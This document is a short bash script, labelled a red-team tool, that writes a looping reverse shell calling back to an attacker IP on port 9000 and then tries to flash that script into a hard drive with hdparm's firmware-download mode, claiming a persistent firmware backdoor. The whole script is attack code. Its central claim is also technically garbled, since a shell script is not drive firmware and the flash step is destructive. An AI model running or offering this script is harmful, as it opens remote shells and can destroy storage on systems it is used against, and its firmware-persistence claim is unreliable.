#!/bin/bash

# Red Team - Advanced Firmware Backdoor Injection

DEVICE="/dev/sda"
FIRMWARE_PAYLOAD="/tmp/firmware_payload.bin"
ATTACKER_IP="192.168.1.100"
ATTACKER_PORT="9000"

# Generate firmware-level backdoor payload
echo "[+] Generating firmware payload..."
cat << EOF > $FIRMWARE_PAYLOAD
#!/bin/sh
while true; do
    /bin/bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1
    sleep 60
done
EOF

# Use hdparm to inject the payload into the hard drive's firmware
echo "[+] Injecting firmware payload into $DEVICE..."
hdparm --fwdownload-mode3 $FIRMWARE_PAYLOAD $DEVICE

echo "[+] Firmware payload injected! Backdoor is now persistent at the firmware level."